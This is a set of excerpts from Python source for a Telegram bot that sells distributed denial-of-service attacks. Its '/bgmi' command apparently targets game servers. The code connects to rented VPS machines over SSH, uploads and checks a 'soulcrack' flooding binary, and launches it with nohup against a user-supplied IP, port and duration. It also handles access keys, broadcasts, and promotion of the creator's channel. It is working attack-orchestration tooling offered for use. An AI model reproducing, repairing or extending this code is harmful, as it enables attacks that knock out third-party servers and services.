...
ATTACK_VIDEOS = [
    ...
    "https://files.catbox.moe/4ii7hy.mp4",
    "https://files.catbox.moe/6v7whg.mp4",
    "https://files.catbox.moe/agn952.mp4",
    "https://files.catbox.moe/nsb0yr.mp4",
    "https://files.catbox.moe/6rulri.mp4",
    "https://files.catbox.moe/lb8vcy.mp4",
    "https://files.catbox.moe/gj4x7z.mp4",
    "https://files.catbox.moe/qyjyd4.mp4",
    "https://files.catbox.moe/qzxycx.mp4"
]
...
def execute_distributed_attack(vps_list, target_ip, target_port, duration, progress_callback=None):
    ...
    for index, (ip, details) in enumerate(vps_list, start=1):
        try:
            ...
            check_cmd = "test -f /home/master/soulcrack && echo 'exists' || echo 'missing'"
            status, output = ssh_execute(ip, details['username'], details['password'], check_cmd)
            
            if not status or 'missing' in output:
                logger.error(f"soulcrack binary not found on {ip}")
                failed += 1
                continue
                
            # Make executable if not already
            ssh_execute(ip, details['username'], details['password'], "chmod +x /home/master/soulcrack")
            
            # Execute attack using configured thread count
            attack_cmd = f"nohup /home/master/soulcrack {target_ip} {target_port} {duration} {THREADS_PER_VPS} >/dev/null 2>&1 &"
...
def welcome_start(message):
    ...
    welcome_text = (
        f"👋🏻 *WELCOME, {user_name}!* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 *THIS IS ADVANCED BOT!*\n\n"
        f"🆔 *User ID:* `{user_id}`\n"
        f"🔐 *Status:* {status_text}{expiry_text}\n\n"
        "📢 *Join Our Official Channel:*\n"
        "[➖ CLICK HERE TO JOIN ➖](https://t.me/RAHUL_RESPECT)\n\n"
        "📌 *Try This Command:*\n"
        "`/bgmi` - 🚀 *Start an attack!*\n\n"
        "👑 *BOT CREATED BY:* [@RAHUL_RESPECT](https://t.me/RAHUL_RESPECT)"
    )

    # Inline buttons
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/RAHUL_RESPECT"))
    keyboard.add(InlineKeyboardButton("👑 CREATOR", url="https://t.me/RAHUL_RESPECT"))
    ...
    bot.send_message(
        ...
        text=(
            "↘️                                                       ↙️\n\n"
            "*[➖ DM FOR REBRANDING ➖](https://t.me/RAHUL_RESPECT)*\n\n"
            "↗️                                                       ↖️"
        ),
        parse_mode="Markdown",
...
def process_stylish_broadcast(message):
    ...
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("📢 𝗝𝗢𝗜𝗡 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/RAHUL_RESPECT")
    )
    keyboard.add(
        InlineKeyboardButton("👑 𝗖𝗥𝗘𝗔𝗧𝗢𝗥", url="https://t.me/RAHUL_RESPECT")
    )
...
- Contact @RAHUL_RESPECT for key issues
""",
...
🆔 Admin ID: <code>1419969308</code>
   Username: @RAHUL_RESPECT 
"""
    bot.send_message(
        message.chat.id,
        caption,
...
def check_vps_status(message):
    ...
    for ip, details in vps_data['vps'].items():
        ...
        binary_status = ssh_execute(ip, details['username'], details['password'], "test -f /home/master/soulcrack && echo 1 || echo 0")[1].strip()
...
def process_binary_upload(message, ip):
    ...
    try:
        ...
        if not file.file_name.startswith('soulcrack'):
            raise ValueError("Only soulcrack binary files allowed")
        ...
        remote_path = f"/home/master/soulcrack"  # Directly to root as soulcrack
...
def process_vps_reset_confirmation(message):
    ...
    for ip, details in vps_data['vps'].items():
        try:
            ...
            # 3. Reinstall attack binary (assuming it's called 'soulcrack')
            ssh_execute(ip, details['username'], details['password'], "rm -f ~/home/master/soulcrack")
...
def handle_attack_command(message):
    ...
    try:
        ...
        bot.send_message(
            ...
            f"📞 Contact support: @RAHUL_RESPECT",
            parse_mode='Markdown'
        )
